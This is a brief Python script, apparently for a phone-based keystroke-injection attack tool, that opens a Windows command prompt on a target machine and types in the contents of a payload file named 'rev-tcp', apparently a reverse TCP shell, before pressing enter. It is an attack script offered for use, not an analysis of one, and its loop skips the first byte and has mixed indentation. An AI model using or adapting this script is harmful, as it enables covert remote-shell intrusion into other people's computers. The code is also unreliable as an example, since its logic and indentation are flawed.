#!/usr/bin/python
import sys
sys.path.append("/sdcard/files/modules/")
from keyseed import *

# pop up cmd
wincmd()

# read payload file
f = open("/sdcard/files/rev-tcp", "rb")
try:
    byte = f.read(1)
    while byte != "":
        byte = f.read(1)
	findinlist(byte)
finally:
    f.close()

#Hit enter
enterb()

